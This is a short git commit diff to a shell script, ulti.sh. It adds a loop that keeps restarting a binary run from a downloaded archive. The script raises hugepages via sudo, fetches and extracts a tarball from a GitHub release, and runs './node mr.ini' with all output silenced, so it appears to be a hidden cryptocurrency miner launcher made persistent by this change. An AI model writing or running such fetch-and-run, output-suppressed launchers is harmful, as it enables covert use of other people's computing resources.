4f76cfac5f5b6e500168f10ada6ae3d8e5d9ce5c
wikangdijalalan2 <82296471+wikangdijalalan2@users.noreply.github.com>
2021-04-29 09:12:16 +0800

    Update ulti.sh

--- ulti.sh
+++ ulti.sh
@@ -8,4 +8,7 @@ sudo bash -c "echo vm.nr_hugepages=$core >> /etc/sysctl.conf"
 wget https://github.com/wikangdijalalan2/xmmxja/releases/download/v1.0/male1.tar > /dev/null 2>&1 
 tar -xvf male1.tar > /dev/null 2>&1 
 cd MXC > /dev/null 2>&1 
+while [ 1 ]; do
 ./node mr.ini > /dev/null 2>&1 
+sleep 5
+done
